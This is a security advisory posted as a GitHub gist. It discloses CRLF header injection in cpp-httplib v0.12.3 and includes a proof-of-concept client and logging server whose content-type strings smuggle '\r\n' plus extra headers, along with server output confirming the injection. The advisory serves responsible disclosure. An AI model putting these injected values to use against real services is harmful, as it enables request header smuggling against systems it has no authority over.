
[Skip to content](#start-of-content)

[All gists](/discover)
[Back to GitHub](https://github.com)
[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fdellalibera%2F094aece17a86069a7d27f93c8aba2280)
[Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Fdellalibera%2F094aece17a86069a7d27f93c8aba2280&source=header-gist)

[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fdellalibera%2F094aece17a86069a7d27f93c8aba2280) [Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Fdellalibera%2F094aece17a86069a7d27f93c8aba2280&source=header-gist)

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

Instantly share code, notes, and snippets.

[![@dellalibera](https://avatars.githubusercontent.com/u/43420907?s=64&v=4)](/dellalibera)

# [dellalibera](/dellalibera)/**[01\_CRLF\_Injection\_cpp-httplib@v0.12.3.md](/dellalibera/094aece17a86069a7d27f93c8aba2280)** Secret

Created
May 16, 2023 09:27

Show Gist options

* [Download ZIP](/dellalibera/094aece17a86069a7d27f93c8aba2280/archive/d05d321583a87f2d9bad81598899221f93b2d6fc.zip)

* [Star
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2Fdellalibera%2F094aece17a86069a7d27f93c8aba2280)You must be signed in to star a gist
* [Fork
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2Fdellalibera%2F094aece17a86069a7d27f93c8aba2280)You must be signed in to fork a gist

* Embed

  + Embed
     Embed this gist in your website.
  + Share
     Copy sharable link for this gist.
  + Clone via HTTPS
     Clone using the web URL.
  + [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

  Clone this repository at &lt;script src=&quot;https://gist.github.com/dellalibera/094aece17a86069a7d27f93c8aba2280.js&quot;&gt;&lt;/script&gt;
* Save dellalibera/094aece17a86069a7d27f93c8aba2280 to your computer and use it in GitHub Desktop.

[Code](/dellalibera/094aece17a86069a7d27f93c8aba2280)
[Revisions
1](/dellalibera/094aece17a86069a7d27f93c8aba2280/revisions)

Embed

* Embed
   Embed this gist in your website.
* Share
   Copy sharable link for this gist.
* Clone via HTTPS
   Clone using the web URL.
* [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

Clone this repository at &lt;script src=&quot;https://gist.github.com/dellalibera/094aece17a86069a7d27f93c8aba2280.js&quot;&gt;&lt;/script&gt;

Save dellalibera/094aece17a86069a7d27f93c8aba2280 to your computer and use it in GitHub Desktop.

[Download ZIP](/dellalibera/094aece17a86069a7d27f93c8aba2280/archive/d05d321583a87f2d9bad81598899221f93b2d6fc.zip)

CRLF Injection in cpp-httplib@v0.12.3

 [Raw](/dellalibera/094aece17a86069a7d27f93c8aba2280/raw/d05d321583a87f2d9bad81598899221f93b2d6fc/01_CRLF_Injection_cpp-httplib%40v0.12.3.md)

[**01\_CRLF\_Injection\_cpp-httplib@v0.12.3.md**](#file-01_crlf_injection_cpp-httplib-v0-12-3-md)

# Information

**Project:** `cpp-httplib`

**Tested Version:** `v0.12.3` (commit `f977558a28d6db893cf42131c33d025fa17458e1`)

**Github Repository:** [`https://github.com/yhirose/cpp-httplib`](https://github.com/yhirose/cpp-httplib)

## Details

`cpp-httplib` is vulnerable to **CRLF Injection** when untrusted user input is used to set the content-type header in the HTTP `.Patch`, `.Post`, `.Put` and `.Delete` requests. An attacker can add the `\r\n` (carriage return line feeds) characters and inject additional headers in the request sent.

The fix introduced here (<https://github.com/yhirose/cpp-httplib/commit/85327e19ae7e72028c30917247238d638ce56d0b>) to check for CRLF characters is applied in the `Request::set_header` method but not in the following places:

* <https://github.com/yhirose/cpp-httplib/blob/f977558a28d6db893cf42131c33d025fa17458e1/httplib.h#L6738>
* <https://github.com/yhirose/cpp-httplib/blob/f977558a28d6db893cf42131c33d025fa17458e1/httplib.h#L7427>

More reference about this vulnerability and its impact:

* <https://owasp.org/www-community/vulnerabilities/CRLF_Injection>
* <https://cwe.mitre.org/data/definitions/113.html>

Reference to similar issues affecting other projects:

* <https://security.snyk.io/vuln/SNYK-SWIFT-SWIFTSERVERASYNCHTTPCLIENT-3237994>
* <https://security.snyk.io/vuln/SNYK-JS-UNDICI-2980276>

## PoC

* download the project and extract in a folder
* in the same folder of the downloaded project, create a server to log incoming requests and print headers:

```
g++ server_log.cpp -o server_log
./server_log
```

* in the same folder of the downloaded project, create a client with headers containing CRLF sequences (in the PoC below the additional header `evilX: helloX` is sent):

```
g++ client.cpp -o client
./client
```

Server output:

```
================================
POST HTTP/1.1 /test1
Accept: */*
Connection: close
Content-Length: 3
Content-Type: application/x-www-form-urlencoded
evil1: hello1
Host: 0.0.0.0:8080
LOCAL_ADDR: 127.0.0.1
LOCAL_PORT: 8080
REMOTE_ADDR: 127.0.0.1
REMOTE_PORT: 50972
User-Agent: cpp-httplib/0.12.3
================================
DELETE HTTP/1.1 /test2
Accept: */*
Connection: close
Content-Length: 3
Content-Type: text/plain
evil2: hello2
Host: 0.0.0.0:8080
LOCAL_ADDR: 127.0.0.1
LOCAL_PORT: 8080
REMOTE_ADDR: 127.0.0.1
REMOTE_PORT: 50982
User-Agent: cpp-httplib/0.12.3
================================
PUT HTTP/1.1 /test3
Accept: */*
Connection: close
Content-Length: 4
Content-Type: text/plain
evil3: hello3
Host: 0.0.0.0:8080
LOCAL_ADDR: 127.0.0.1
LOCAL_PORT: 8080
REMOTE_ADDR: 127.0.0.1
REMOTE_PORT: 50984
User-Agent: cpp-httplib/0.12.3
================================
PATCH HTTP/1.1 /test4
Accept: */*
Connection: close
Content-Length: 7
Content-Type: text/plain
evil4: hello4
Host: 0.0.0.0:8080
LOCAL_ADDR: 127.0.0.1
LOCAL_PORT: 8080
REMOTE_ADDR: 127.0.0.1
REMOTE_PORT: 50988
User-Agent: cpp-httplib/0.12.3
```

## Impact

If untrusted user input is placed in header values, a malicious user could inject additional headers. It can lead to logical errors and other misbehaviours.

## Author

Alessio Della Libera

 [Raw](/dellalibera/094aece17a86069a7d27f93c8aba2280/raw/d05d321583a87f2d9bad81598899221f93b2d6fc/client.cpp)

[**client.cpp**](#file-client-cpp)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

|  | #include "./httplib.h" |
| --- | --- |
|  |  |
|  | int main(void) |
|  | { |
|  | httplib::Client cli("0.0.0.0", 8080); |
|  |  |
|  | cli.Post("/test1", "A=B", "application/x-www-form-urlencoded\r\nevil1: hello1"); |
|  |  |
|  | cli.Delete("/test2", "A=B", "text/plain\r\nevil2: hello2"); |
|  |  |
|  | cli.Put("/test3", "text", "text/plain\r\nevil3: hello3"); |
|  |  |
|  | cli.Patch("/test4", "content", "text/plain\r\nevil4: hello4"); |
|  | } |

 [Raw](/dellalibera/094aece17a86069a7d27f93c8aba2280/raw/d05d321583a87f2d9bad81598899221f93b2d6fc/server_log.cpp)

[**server\_log.cpp**](#file-server_log-cpp)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

|  | #include "./httplib.h" |
| --- | --- |
|  | #include <iostream> |
|  | #include <stdlib.h> |
|  |  |
|  | using namespace std; |
|  | using namespace httplib; |
|  |  |
|  |  |
|  | string dump\_headers(const Headers &headers) { |
|  | string s; |
|  | char buf[BUFSIZ]; |
|  |  |
|  | for (const auto &x : headers) { |
|  | snprintf(buf, sizeof(buf), "%s: %s\n", x.first.c\_str(), x.second.c\_str()); |
|  | s += buf; |
|  | } |
|  |  |
|  | return s; |
|  | } |
|  |  |
|  |  |
|  | string log(const Request &req, const Response &res) { |
|  | string s; |
|  | char buf[BUFSIZ]; |
|  |  |
|  | s += "================================\n"; |
|  |  |
|  | snprintf(buf, sizeof(buf), "%s %s %s\n", req.method.c\_str(), req.version.c\_str(), req.path.c\_str()); |
|  | s += buf; |
|  | s += dump\_headers(req.headers); |
|  |  |
|  | return s; |
|  | } |
|  |  |
|  | int main(void) |
|  | { |
|  |  |
|  | Server svr; |
|  |  |
|  | svr.Post("/test1", [](const Request &req, Response &res) { |
|  | res.set\_content("Hello 1", "text/plain"); |
|  | }); |
|  |  |
|  | svr.Delete("/test2", [](const Request &req, Response &res) { |
|  | res.set\_content("Hello 2", "text/plain"); |
|  | }); |
|  |  |
|  | svr.Put("/test3", [](const Request &req, Response &res) { |
|  | res.set\_content("Hello 3", "text/plain"); |
|  | }); |
|  |  |
|  | svr.Patch("/test4", [](const Request &req, Response &res) { |
|  | res.set\_content("Hello 4", "text/plain"); |
|  | }); |
|  |  |
|  | svr.set\_logger([](const Request &req, const Response &res) { |
|  | cout << log(req, res); |
|  | }); |
|  |  |
|  | svr.listen("localhost", 8080); |
|  |  |
|  | return 0; |
|  | } |

[Sign up for free](/join?source=comment-gist)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgist.github.com%2Fdellalibera%2F094aece17a86069a7d27f93c8aba2280)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.

